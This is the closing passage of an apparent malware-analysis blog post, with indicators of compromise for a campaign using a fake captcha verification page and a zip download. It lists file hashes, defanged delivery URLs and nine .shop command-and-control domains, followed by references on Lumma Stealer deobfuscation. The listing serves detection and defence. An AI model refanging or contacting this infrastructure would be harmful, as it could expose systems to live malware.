            <div class="kg-toggle-content"><p><b><strong style="white-space: pre-wrap;">File Hash</strong></b><br><span style="white-space: pre-wrap;">SHA256: fe236cf05365f3fafd7fdf2481cee9b9a5ff087e1ddc5b71fea1bb23b0c306db -&gt; Injected Process</span></p><p><span style="white-space: pre-wrap;"> SHA256: fbef3b6316cd8cf77978c8eac780fe471654c0b5dbbc812e4e266475bde39dcc -&gt; 0Aeon Timeline.exe</span></p><p><span style="white-space: pre-wrap;">===================================================</span><br><b><strong style="white-space: pre-wrap;">URL:</strong></b><br><span style="white-space: pre-wrap;">hxxps[:]//human-check.b-cdn[.]net/verify-captcha-v7[.]html</span><br><span style="white-space: pre-wrap;">hxxps[://]poko[.]b-cdn[.]net/wifi[.]zip</span></p><p><span style="white-space: pre-wrap;">===================================================</span><br><b><strong style="white-space: pre-wrap;">C2:</strong></b><br><span style="white-space: pre-wrap;">bassizcellskz[.]shop</span><br><span style="white-space: pre-wrap;">celebratioopz[.]shop</span><br><span style="white-space: pre-wrap;">complaintsipzzx[.]shop</span><br><span style="white-space: pre-wrap;">deallerospfosu[.]shop</span><br><span style="white-space: pre-wrap;">futureddospzmvq[.]shop -&gt; Found inside the binary</span><br><span style="white-space: pre-wrap;">languagedscie[.]shop</span><br><span style="white-space: pre-wrap;">mennyudosirso[.]shop</span><br><span style="white-space: pre-wrap;">quialitsuzoxm[.]shop</span><br><span style="white-space: pre-wrap;">writerospzm[.]shop</span></p></div>
        </div><h2 id="reference">Reference:</h2><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://stackoverflow.com/questions/4608489/how-to-pick-an-appropriate-iv-initialization-vector-for-aes-ctr-nopadding?ref=denwp.com"><div class="kg-bookmark-content"><div class="kg-bookmark-title">How to pick an appropriate IV (Initialization Vector) for AES/CTR/NoPadding?</div><div class="kg-bookmark-description">I would like to encrypt the cookies that are written by a webapp and I would like to keep the size of the cookies to minimum, hence the reason I picked AES/CTR/NoPadding. What would you recommendâ€¦</div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="https://cdn.sstatic.net/Sites/stackoverflow/Img/apple-touch-icon.png?v=c78bd457575a" alt=""><span class="kg-bookmark-author">Stack Overflow</span><span class="kg-bookmark-publisher">Drew</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://cdn.sstatic.net/Sites/stackoverflow/Img/apple-touch-icon@2.png?v=73d79a89bded" alt="" onerror="this.style.display = 'none'"></div></a></figure><figure class="kg-card kg-embed-card"><iframe width="200" height="150" src="https://www.youtube.com/embed/lmMA4WYJEOY?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen="" title="Decoding Obfuscated Powershell and HTA Files (Lumma Stealer)"></iframe></figure><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://github.com/hasherezade/hollows_hunter?ref=denwp.com"><div class="kg-bookmark-content"><div class="kg-bookmark-title">GitHub - hasherezade/hollows_hunter: Scans all running processes. Recognizes and dumps a variety of potentially malicious implants (replaced/implanted PEs, shellcodes, hooks, in-memory patches).</div><div class="kg-bookmark-description">Scans all running processes. Recognizes and dumps a variety of potentially malicious implants (replaced/implanted PEs, shellcodes, hooks, in-memory patches). - hasherezade/hollows_hunter</div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="https://github.githubassets.com/assets/pinned-octocat-093da3e6fa40.svg" alt=""><span class="kg-bookmark-author">GitHub</span><span class="kg-bookmark-publisher">hasherezade</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://opengraph.githubassets.com/e656b79a8152c3ac0f8024f5cdcd0f1e1cb9b52d596dccc070ce7d40cb2544ec/hasherezade/hollows_hunter" alt="" onerror="this.style.display = 'none'"></div></a></figure>
    </section>


</article>
</main>




            <aside class="read-more-wrap outer">
                <div class="read-more inner">
                        
<article class="post-card post">

    <a class="post-card-image-link" href="/unexplored-lolbas-technique-wevtutil-exe/">

        <img class="post-card-image"
            srcset="/content/images/size/w300/2024/11/apt.gif 300w,
                    /content/images/size/w600/2024/11/apt.gif 600w,
                    /content/images/size/w1000/2024/11/apt.gif 1000w,
                    /content/images/size/w2000/2024/11/apt.gif 2000w"
            sizes="(max-width: 1000px) 400px, 800px"
            src="/content/images/size/w600/2024/11/apt.gif"
            alt="Unexplored LOLBAS Technique: Wevtutil.exe"
            loading="lazy"
        />


    </a>

    <div class="post-card-content">

        <a class="post-card-content-link" href="/unexplored-lolbas-technique-wevtutil-exe/">
            <header class="post-card-header">
                <div class="post-card-tags">
                </div>
                <h2 class="post-card-title">
                    Unexplored LOLBAS Technique: Wevtutil.exe
                </h2>
            </header>
                <div class="post-card-excerpt">Wevtutil.exe manages Windows event logs, aiding system admins but exploitable by attackers for log manipulation, evasion, and data exfiltration.</div>
        </a>

        <footer class="post-card-meta">
            <time class="post-card-meta-date" datetime="2024-11-25">Nov 25, 2024</time>
                <span class="post-card-meta-length">6 min read</span>
        </footer>

    </div>

</article>
                        
<article class="post-card post featured">

    <a class="post-card-image-link" href="/xattr-lazarus-groups-abuse-rustyattr/">

        <img class="post-card-image"
            srcset="/content/images/size/w300/2024/11/4.gif 300w,
                    /content/images/size/w600/2024/11/4.gif 600w,
                    /content/images/size/w1000/2024/11/4.gif 1000w,
                    /content/images/size/w2000/2024/11/4.gif 2000w"
            sizes="(max-width: 1000px) 400px, 800px"
            src="/content/images/size/w600/2024/11/4.gif"
            alt="Hidden World of xattr: Lazarus Groupâ€™s Abuse of &quot;Rustyattr&quot; to Evade Detection"
            loading="lazy"
        />


    </a>

    <div class="post-card-content">

        <a class="post-card-content-link" href="/xattr-lazarus-groups-abuse-rustyattr/">
            <header class="post-card-header">
                <div class="post-card-tags">
                        <span class="post-card-featured"><svg width="16" height="17" viewBox="0 0 16 17" fill="none" xmlns="http://www.w3.org/2000/svg">
    <path d="M4.49365 4.58752C3.53115 6.03752 2.74365 7.70002 2.74365 9.25002C2.74365 10.6424 3.29678 11.9778 4.28134 12.9623C5.26591 13.9469 6.60127 14.5 7.99365 14.5C9.38604 14.5 10.7214 13.9469 11.706 12.9623C12.6905 11.9778 13.2437 10.6424 13.2437 9.25002C13.2437 6.00002 10.9937 3.50002 9.16865 1.68127L6.99365 6.25002L4.49365 4.58752Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
</svg> Featured</span>
                </div>
                <h2 class="post-card-title">
                    Hidden World of xattr: Lazarus Groupâ€™s Abuse of &quot;Rustyattr&quot; to Evade Detection
                </h2>
            </header>
                <div class="post-card-excerpt">Lazarus Group hides malware in macOS extended attributes (xattr), evading detection.</div>
        </a>

        <footer class="post-card-meta">
            <time class="post-card-meta-date" datetime="2024-11-19">Nov 19, 2024</time>
                <span class="post-card-meta-length">7 min read</span>
        </footer>

    </div>

</article>
                        
<article class="post-card post">

    <a class="post-card-image-link" href="/sload-malware-delivery-through-phishing-campaigns-in-ukraine/">

        <img class="post-card-image"
            srcset="/content/images/size/w300/2024/11/2.gif 300w,
                    /content/images/size/w600/2024/11/2.gif 600w,
                    /content/images/size/w1000/2024/11/2.gif 1000w,
                    /content/images/size/w2000/2024/11/2.gif 2000w"
            sizes="(max-width: 1000px) 400px, 800px"
            src="/content/images/size/w600/2024/11/2.gif"
            alt="sLoad Malware Delivery Through Phishing Campaigns in Ukraine"
            loading="lazy"
        />


    </a>

    <div class="post-card-content">

        <a class="post-card-content-link" href="/sload-malware-delivery-through-phishing-campaigns-in-ukraine/">
            <header class="post-card-header">
                <div class="post-card-tags">
                </div>
                <h2 class="post-card-title">
                    sLoad Malware Delivery Through Phishing Campaigns in Ukraine
                </h2>
            </header>
                <div class="post-card-excerpt">Phishing campaign targets Ukraine, delivering sLoad malware through fake PDF links in .rar files, with advanced obfuscation and reconnaissance tactics.</div>
        </a>

        <footer class="post-card-meta">
            <time class="post-card-meta-date" datetime="2024-11-01">Nov 1, 2024</time>
                <span class="post-card-meta-length">5 min read</span>
        </footer>

    </div>

</article>
                </div>
            </aside>



    </div>

    <footer class="site-footer outer">
        <div class="inner">
            <section class="copyright"><a href="https://denwp.com">Denwp Research</a> &copy; 2024</section>
            <nav class="site-footer-nav">
                
            </nav>
            <div class="gh-powered-by"><a href="https://ghost.org/" target="_blank" rel="noopener">Powered by Ghost</a></div>
        </div>
    </footer>

</div>

    <div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <div class="pswp__bg"></div>

    <div class="pswp__scroll-wrap">
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>
<script
    src="https://code.jquery.com/jquery-3.5.1.min.js"
    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0="
    crossorigin="anonymous">
</script>
<script src="/assets/built/casper.js?v=c619e7c725"></script>
<script>
$(document).ready(function () {
    // Mobile Menu Trigger
    $('.gh-burger').click(function () {
        $('body').toggleClass('gh-head-open');
    });
    // FitVids - Makes video embeds responsive
    $(".gh-content").fitVids();
});
</script>



<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'8e915c8d1e78e015',t:'MTczMjcwMjU3NC4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script><script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"rayId":"8e915c8d1e78e015","version":"2024.10.5","r":1,"serverTiming":{"name":{"cfExtPri":true,"cfL4":true,"cfSpeedBrain":true,"cfCacheStatus":true}},"token":"4ef34a29ac024b3d850e7e0298f90d61","b":1}' crossorigin="anonymous"></script>
</body>
</html>
